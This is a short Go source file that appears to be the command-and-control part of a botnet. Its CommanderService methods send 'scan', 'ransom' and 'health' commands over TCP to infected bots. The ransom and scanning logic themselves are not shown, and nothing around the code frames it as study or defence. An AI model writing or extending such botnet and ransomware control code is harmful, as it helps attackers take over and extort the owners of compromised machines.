package tcp

import (
	"github.com/rodzzlessa24/botnet"
)

//ScanCmd is
func (c *CommanderService) ScanCmd(addr string) error {
	botnet.Msg("sending scan request")
	req := &scanRequest{
		Type:  "simple",
		Hosts: []string{"127.0.0.1"},
	}
	b, err := botnet.Bytes(req)
	if err != nil {
		return err
	}
	payload := append(commandToBytes("scan"), b...)
	return sendData(addr, payload)
}

//RansomCmd is
func (c *CommanderService) RansomCmd(addr string) error {
	return sendData(addr, commandToBytes("ransom"))
}

//CheckBotHealth is
func (c *CommanderService) CheckBotHealth(bot *botnet.Bot) error {
	return sendData(bot.Addr(), commandToBytes("health"))
}
